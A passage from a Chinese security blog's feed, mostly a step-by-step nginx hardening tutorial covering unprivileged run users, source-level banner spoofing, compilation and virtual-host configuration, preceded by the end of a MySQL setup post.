&lt;p&gt;0x03 下载,解压 mysql-5.6.27-linux-glibc2.5-x86_64.tar.gz&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# tar xf mysql-5.6.27-linux-glibc2.5-x86_64.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# mv mysql-5.6.27-linux-glibc2.5-x86_64 /usr/local/&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ln -s /usr/local/mysql-5.6.27-linux-glibc2.5-x86_64/ /usr/local/mysql&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# ls -l /usr/local/mysql/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;0x04 开始初始化mysql&lt;/p&gt;
&lt;p&gt;务必以一个伪用户身份来运行mysql服务,防止别人利用mysql进行提权,后面还会再细说,另外,web服务和数据库服务严禁用同一个系统用户,这样做主要是为了防止入侵者直接通过sql语句往网站目录中写webshell&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# useradd -s /sbin/nologin -M mysql&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="mysqlsec" scheme="https://evil-404.github.io/categories/mysqlsec/"/>
    
    
      <category term="mysqlsec" scheme="https://evil-404.github.io/tags/mysqlsec/"/>
    
  </entry>
  
  <entry>
    <title>从 0 开始构建一个 &quot;固若金汤&quot; 的nginx</title>
    <link href="https://evil-404.github.io/2017-11-21-nginx-sec.html"/>
    <id>https://evil-404.github.io/2017-11-21-nginx-sec.html</id>
    <published>2017-11-20T20:09:17.000Z</published>
    <updated>2017-12-03T11:18:18.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>0x01 关于 nginx<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">配置灵活,简单,运行时占用系统资源较少,功能模块繁多,可扩展性极强,基于 C ,整个工具大小1M左右</span><br><span class="line">支持高并发,仅限于全部为纯静态文件的情况下,因为最终还要取决于后端 [ 脚本和数据库 ] 的实际处理速度</span><br><span class="line">默认 nginx 会自动选择最佳的网络I/O模型,和nginx不同的是,apache默认就会使用select模型,效率较低</span><br><span class="line">上面这些话的意思也就是说,你的C要牛逼到一定的程度,不然,想做深度二次开发基本是扯淡,真心挺佩服毛子的</span><br><span class="line">更多说明,请直接参考官方文档...</span><br></pre></td></tr></table></figure></p><p>0x02 正确理解 linux 对文件,目录,<code>[ 读 写 执行 ]</code> 权限的真正含义,这东西不能靠干说,因为根本理解不扎实,大家可以自己在系统中创建两个普通用户,不停地切换目录文件权限,以深入仔细体会,后面网站目录权限设置要用到这些基础,如果连这些都搞不清,想灵活应用就难了,耐心点,等透彻理解之后,你就会发现真TM简单 </p><p>目录 <code>读[r / 4]</code> <code>写[w / 2]</code> <code>执行[x / 1]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读:   ls , dir ... 表示可查看该目录下的文件列表</span><br><span class="line">写:   rm , mv, cp, mkdir ,touch ...表示可在该目录下创建,删除,修改文件或者子目录,不过在这之前,一定要先有执行权限,不然进都进不去,又怎么写呢</span><br><span class="line">执行: cd  ...表示可进入该目录</span><br></pre></td></tr></table></figure></p><p>文件 <code>读[r / 4]</code> <code>写[w / 2]</code> <code>执行[x / 1]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读:cat , tac , more , less ,head , tail ... 表示可查看该文件中的内容</span><br><span class="line">写:vi , nano , echo ... 只表示可对文件中的 内容 进行增删改,删除文件还要取决于当前用户对该文件所在目录是否有写权限</span><br><span class="line">执行:可执行文件,shell脚本... 在linux中任何文件都可以有执行权限,但只有可执行文件和脚本才能真正执行</span><br></pre></td></tr></table></figure></p><a id="more"></a><p>0x03 nginx 容易出现问题的一些点,只要不是直接可以远程利用的,暂不必过于紧张:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nginx 本身可能存在的一些漏洞,如,各类 敏感信息泄露,RCE,DDOS [根据目前已公开的暂未知]...</span><br><span class="line">各种配置错误,如,目录遍历造成的敏感信息泄露,低版本的解析漏洞...</span><br><span class="line">也有躺枪的可能,第三方模块和库漏洞,如,心脏滴血...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>0x04 常用功能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web[ 各类常规web服务功能,如虚拟主机,基本认证... ]</span><br><span class="line">负载均衡[ 反向代理 ]</span><br><span class="line">缓存[ web缓存 ]</span><br></pre></td></tr></table></figure></p><p>0x05 在开始说nginx之前,我们先来简单理解下<code>select模型</code> ,<code>poll 模型</code>和<code>epoll 模型</code> ,后续有空咱们会再单独拿出来细说,毕竟不是这次的重点,所以只能先简单科普下,能理解大致工作流程即可 </p><p><code>IO多路复用</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">三种模型同属IO多路复用机制,即同时监视多个描述符,一旦某个描述符读或写就绪,就通知相应的程序进行对应的读写操作</span><br><span class="line">通俗来讲,就是单个进程可以同时处理多个网络连接的IO,原理即通过select,poll,epoll函数不断轮询所负责的所有socket</span><br><span class="line">当某个socket处于就绪状态,就通知指定的用户进程去处理,但select，poll，epoll本质上又都是同步I/O</span><br><span class="line">因为他们都需要在读写事件就绪后自己负责进行读写,也就是说,整个读写过程是处于阻塞状态的</span><br><span class="line">而异步I/O则无需自己负责进行读写,异步I/O的实现会负责把数据从内核拷到用户空间</span><br></pre></td></tr></table></figure></p><p><code>select 模型</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select目前几乎支持所有的平台,同步IO处理读写会一直处于阻塞状态,select就是这样,调用select函数后会一直处于阻塞状态,直到有描述符就绪</span><br><span class="line">但select缺点之一就是,单个进程能够监视的文件描述符的数量有大小限制</span><br><span class="line">在linux上一般为1024,虽然可以通过修改宏定义或者重新编译内核的方式提升这一限制,但这样也会造成效率低下</span><br><span class="line">select对socket进行扫描时属于线性扫描,即逐个轮询,效率较低</span><br></pre></td></tr></table></figure></p><p><code>poll模型</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">poll本质上和select区别不太大,它将用户传入的数组拷贝到内核空间,然后轮询每个描述符对应的设备状态</span><br><span class="line">如果设备就绪,则在设备等待队列中加入一项并继续遍历,如果遍历完所有描述符后没有发现就绪设备</span><br><span class="line">则挂起当前进程,直到设备就绪或者超时,被唤醒后它又要再次遍历描述符,整个过程经历了多次无用的遍历</span><br><span class="line">另外,它不再使用select&quot;key-value&quot;的传递方式,且pollfd没有最大数量限制</span><br></pre></td></tr></table></figure></p><p><code>epoll模型</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">属于select和poll的增强改进版,epoll对文件描述符的操作有两种模式</span><br><span class="line"></span><br><span class="line">LT模式:</span><br><span class="line">当epoll_wait检测到描述符事件发生并将此事件通知应用程序,应用程序可以不立即处理该事件</span><br><span class="line">下次调用epoll_wait时,会再次响应应用程序并通知此事件,效率相对来讲较高</span><br><span class="line"></span><br><span class="line">ET模式: </span><br><span class="line">当epoll_wait检测到描述符事件发生并将此事件通知应用程序,应用程序必须立即处理该事件</span><br><span class="line">如果不处理,下次调用epoll_wait时,不会再次响应应用程序并通知此事件</span><br></pre></td></tr></table></figure></p><p>0x06 此次演示环境,如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CentOS6.8 x86_64    最小化,带基础库安装 eth0: 192.168.3.42 eth1: 192.168.4.14  eth2: 192.168.5.14</span><br><span class="line">nginx-1.12.2.tar.gz</span><br></pre></td></tr></table></figure></p><p>0x07 下载,编译安装 nginx 1.12.2 ,注意,这里暂时就用最新版的稳定版本,实际生产环境中版本可以稍低一些,稳定为主,选择版本时应尽量避开一些已知的高危漏洞版本</p><p>创建nginx运行账户,尽量以伪用户身份来运行nginx服务,切记,千万不要直接用root权限来运行nginx,否则别人拿到的webshell权限很可能直接是root权限的 <code>[ 如果你后面的的fastcgi服务端 [php-fpm] 和 nginx使用的是同一用户身份来运行,就很容造成这种情况 ]</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># useradd -s /sbin/nologin -M nginx</span><br></pre></td></tr></table></figure></p><p>先安装好所需的各中依赖库和编译器,下载 nginx-1.12.2.tar.gz 源码包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># yum install pcre pcre-devel openssl openssl-devel gcc gcc-c++ automake zlib zlib-devel -y</span><br><span class="line"># wget http://nginx.org/download/nginx-1.12.2.tar.gz</span><br><span class="line"># tar xf nginx-1.12.2.tar.gz</span><br><span class="line"># cd nginx-1.12.2</span><br></pre></td></tr></table></figure></p><p>源码级修改nginx默认版本号,虽然,还可以后续在配置文件中改,但那个改的毕竟不彻底,它只是简单的把详细的版本号给去掉了,<code>nginx</code>字样还留着呢,其实,这里你改成 <code>apache</code> 也许会更具迷惑性,因为通过在url中转换大小写请求依然是可以试出来目标机器到底是linux还是windows平台,大家看到,我这里是直接改成了<code>IIS 8.5</code>,正常来讲 <code>IIS 8.5</code> 所对应的系统平台应该是<code>windows server 2012R2</code>,但如果别人此时试出来我的机器却是linux平台,很可能就会产生怀疑,因为linux平台是不可能装IIS的,起码暂时是不能的,如果你这里换成apache也许对方就信了,因为apache在linux平台部署再正常不过,然后入侵者,可能就会去尝试一些和apache相关的漏洞,也就是说,你把入侵者引向了一条根本不通的路,另外,有很多获取web服务器banner的扫描工具,基本也都是靠截取的http响应头中<code>server</code>字段的内容 <code>真正靠服务器指纹识别的那种不算</code>,这样一来,也顺便把别人的工具都蒙骗了,反正,尽可能在信息搜集阶段就扰乱入侵者的视线,因为有些漏洞只针对特定类型,特定版本,这样可以一定程度上扰乱对方的判断和后续的渗透方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi src/core/nginx.h</span><br></pre></td></tr></table></figure></p><p><img src="/img/hidden nginx version.png" alt=""></p><p>查看nginx支持的所有模块,可根据自己的实际需求选择性的启用,对于一些曾经爆过严重漏洞的模块,要格外仔细小心,每个功能模块在其官方文档中都有详细说明及使用样例,具体可参考 <a href="http://nginx.org/en/docs/" target="_blank" rel="noopener">http://nginx.org/en/docs/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># ./configure --help</span><br></pre></td></tr></table></figure></p><p>开始编译安装nginx,具体编译参数,如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># ./configure --prefix=/usr/local/nginx-1.12.2 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module</span><br><span class="line"># make &amp;&amp; make install</span><br><span class="line"># ln -s /usr/local/nginx-1.12.2/ /usr/local/nginx</span><br></pre></td></tr></table></figure></p><p>编译安装没问题以后,我们先大致看看 nginx 的基本目录结构,初步了解下里面的文件工具都是干什么用的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># tree -L 2 /usr/local/nginx</span><br><span class="line">├── client_body_temp</span><br><span class="line">├── confnginx 配置文件目录</span><br><span class="line">│   ├── fastcgi.conf后端动态脚本接口配置,如,php,java...</span><br><span class="line">│   ├── fastcgi.conf.default</span><br><span class="line">│   ├── fastcgi_params</span><br><span class="line">│   ├── fastcgi_params.default</span><br><span class="line">│   ├── koi-utf</span><br><span class="line">│   ├── koi-win</span><br><span class="line">│   ├── mime.types</span><br><span class="line">│   ├── mime.types.default</span><br><span class="line">│   ├── nginx.confnginx 主配置文件</span><br><span class="line">│   ├── nginx.conf.bak</span><br><span class="line">│   ├── nginx.conf.default</span><br><span class="line">│   ├── scgi_params</span><br><span class="line">│   ├── scgi_params.default</span><br><span class="line">│   ├── uwsgi_params</span><br><span class="line">│   ├── uwsgi_params.default</span><br><span class="line">│   └── win-utf</span><br><span class="line">├── fastcgi_temp</span><br><span class="line">├── htmlnginx 站点目录</span><br><span class="line">│   ├── 50x.html</span><br><span class="line">│   └── index.html</span><br><span class="line">├── logsnginx 自身日志目录</span><br><span class="line">│   ├── access.log访问日志</span><br><span class="line">│   └── error.log错误日志</span><br><span class="line">├── proxy_temp</span><br><span class="line">├── sbinnginx 服务管理工具</span><br><span class="line">│   └── nginx</span><br><span class="line">├── scgi_temp</span><br><span class="line">└── uwsgi_temp</span><br></pre></td></tr></table></figure></p><p>再来查看nginx的详细版本,可以看到,我们刚刚在源码中修改的版本号,此时已经生效了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -v</span><br></pre></td></tr></table></figure></p><p><img src="/img/hidden nginx version res.png" alt=""></p><p>关于nginx服务管理工具本身的一些用法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -V 查看编译时的详细参数,如果当初nginx不是你编译的</span><br></pre></td></tr></table></figure></p><p><img src="/img/hidden compile args.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># cat /usr/local/nginx/logs/error.log nginx错误日志,nginx在运行中有任何错误,都可以尝试去该日志文件中查找原因</span><br><span class="line"># /usr/local/nginx/sbin/nginx -h查看nginx管理工具使用帮助</span><br><span class="line"># /usr/local/nginx/sbin/nginx启动nginx服务</span><br><span class="line"># netstat -tulnp | grep &quot;:80&quot;查看nginx进程是否存在</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s quit关闭nginx服务</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload 平滑重启nginx</span><br><span class="line"># echo &quot;/usr/local/nginx/sbin/nginx&quot; &gt;&gt; /etc/rc.local加入自启动</span><br><span class="line"># cd /usr/local/nginx/conf/ &amp;&amp; mv nginx.conf nginx.conf.bak &amp;&amp; egrep -v &quot;^$|#&quot; nginx.conf.default &gt; nginx.conf  简化配置文件</span><br></pre></td></tr></table></figure><p>0x08 装完以后,我们就开始真正配置nginx,下面是关于<code>nginx.conf</code>中各标签段用途的简要说明,注意,在配置nginx时,所有语句结尾必须有分号,基本配置语法</p><p><code>main区</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;# 指定进程个数,一般和实际机器可用的CPU核数保持一致</span><br><span class="line">error_log  logs/error.log error;# 指定错误日志存放位置,级别推荐crit或error</span><br><span class="line">pid  logs/nginx.pid# 进程id号存放位置</span><br></pre></td></tr></table></figure></p><p><code>事件区</code> 可以在此区域指定处理模型,如,epoll或select<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;# 每个进程能处理的最大并发连接数</span><br><span class="line">    multi_accept on;</span><br><span class="line">    use epoll;# 使用epoll模型</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><code>http 区</code> 主要用来配置和http自身相关的一些参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;# 如果是磁盘IO 重负载业务,可以设为off,如,专门提供下载</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    autoindex off;# 禁止目录遍历,其实默认就是禁止的</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    # 一个sever标签段即代表一个站点,这里可能也是我们后续要打交道最多的区域</span><br><span class="line">    # server 标签段实际中也可以单独抠到指定文件中,然后再用include包含到nginx.conf中,如,各类虚拟主机</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;# 监听的ip和web端口</span><br><span class="line">        server_name  localhost;# 指定域名</span><br><span class="line">        </span><br><span class="line">location / &#123;# 定义站点目录位置和索引文件,location 即表示符合什么样的uri就做什么样的操作</span><br><span class="line">            root   html;# 这里都是相对目录,都是相对于nginx的安装目录</span><br><span class="line">            index  index.html index.htm;# 定义好主页索引文件</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"># 当出现如下响应状态码时,就返回指定的错误页</span><br><span class="line">        error_page   500 502 503 504  /50x.html;</span><br><span class="line">        location = /50x.html &#123;</span><br><span class="line">            root   html;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>0x09 配置基于各种类型的虚拟主机,在nginx中,每一个server标签段即表示一个虚拟主机<code>即一个站点</code>,也就是说,在同一台机器上可以同时有N个虚拟主机,只需要在后面接着一直加server段即可,注意,如果客户端直接用ip访问,默认nginx会读取第一个server标签段的配置进行响应,因为nginx无法通过请求头中的host内容来确定是哪个虚拟主机,如果你不在host中指定域名,它默认就会选择第一个</p><p>先处理好nginx.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  1;</span><br><span class="line">error_log  logs/error.log error;</span><br><span class="line">pid  logs/nginx.pid</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">    multi_accept on;</span><br><span class="line">    use epoll;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    autoindex off;</span><br><span class="line"></span><br><span class="line">    # 包含外部配置文件,简化nginx.conf配置,方便后续维护,推荐把不同的server分别定义再不同的文件中,如下</span><br><span class="line">    include extra/bwapp.conf;</span><br><span class="line">    include extra/dvws.conf;</span><br><span class="line">    include extra/drupal7.conf;</span><br><span class="line">    include extra/status.conf;</span><br><span class="line">    include extra/rwrites.conf;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置基于域名的虚拟主机,通常都是指需要直接暴露在公网中的站点,即所谓的各种子域</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /usr/local/nginx/conf/extra</span><br><span class="line"># mkdir /usr/local/nginx/html/bwapp</span><br><span class="line"># echo &quot;&lt;h2&gt;Hello bwapp ^_^&lt;/h2&gt;&quot; &gt; /usr/local/nginx/html/bwapp/index.html</span><br><span class="line"># vi /usr/local/nginx/conf/extra/bwapp.conf</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line"></span><br><span class="line">    # 设置别名,其实是可以用url重写来实现的,不过别名效率更高,起码不用再向服务器端请求一次</span><br><span class="line">    server_name  bwapp.org test.bwapp.org;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root   html/bwapp;</span><br><span class="line">        index  index.html;</span><br><span class="line">    &#125;</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html/bwapp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/vmmac domain.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure><p>配置基于端口的虚拟主机,主要供内部人员办公使用,如各类oa…访问不同的端口即会访问到不同的站点目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /usr/local/nginx/html/dvws</span><br><span class="line"># echo &quot;&lt;h2&gt;Hello dvws ^_^&lt;/h2&gt;&quot; &gt; /usr/local/nginx/html/dvws/index.html</span><br><span class="line"># cp /usr/local/nginx/conf/extra/bwapp.conf /usr/local/nginx/conf/extra/dvws.conf</span><br><span class="line"># vi /usr/local/nginx/conf/extra/dvws.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       81;</span><br><span class="line">    server_name  test.dvws.org;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root   html/dvws;</span><br><span class="line">        index  index.html;</span><br><span class="line">    &#125;</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html/dvws;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><p><img src="/img/vmmac port.png" alt=""></p><p>配置基于ip的虚拟主机,需要一台服务器上同时有多个ip,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># mkdir /usr/local/nginx/html/drupal7</span><br><span class="line"># echo &quot;&lt;h2&gt;Hello drupal7 vuln ^_^&lt;/h2&gt;&quot; &gt; /usr/local/nginx/html/drupal7/index.html</span><br><span class="line"># cp /usr/local/nginx/conf/extra/bwapp.conf /usr/local/nginx/conf/extra/drupal7.conf</span><br><span class="line"># vi /usr/local/nginx/conf/extra/drupal7.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # 默认不给ip的话,表示监听任意ip,也就说,所有ip都可以来连</span><br><span class="line">    listen       192.168.3.42:82;</span><br><span class="line">    server_name  test.drupal7.org;</span><br><span class="line">    location / &#123;</span><br><span class="line">        root   html/drupal7;</span><br><span class="line">        index  index.html;</span><br><span class="line">    &#125;</span><br><span class="line">    error_page   500 502 503 504  /50x.html;</span><br><span class="line">    location = /50x.html &#123;</span><br><span class="line">        root   html/drupal7;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># /usr/local/nginx/sbin/nginx -t</span><br><span class="line"># /usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure><p><img src="/img/vmmac ip.png" alt=""></p><p>0x10 利用nginx自身提供的状态模块,来监控指定机器的nginx服务运行状态,如下,直接新建一个server标签段,访问指定的域名即可查看对应nginx服务状态<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># vi /usr/local/nginx/conf/extra/status.conf</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen       80;</span><br><span class="line">    server_name  test.status.org;</span><br><span class="line">    location / &#123;</span><br><span class="line">stub_status on;</span><br><span class="line">        access_log off;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 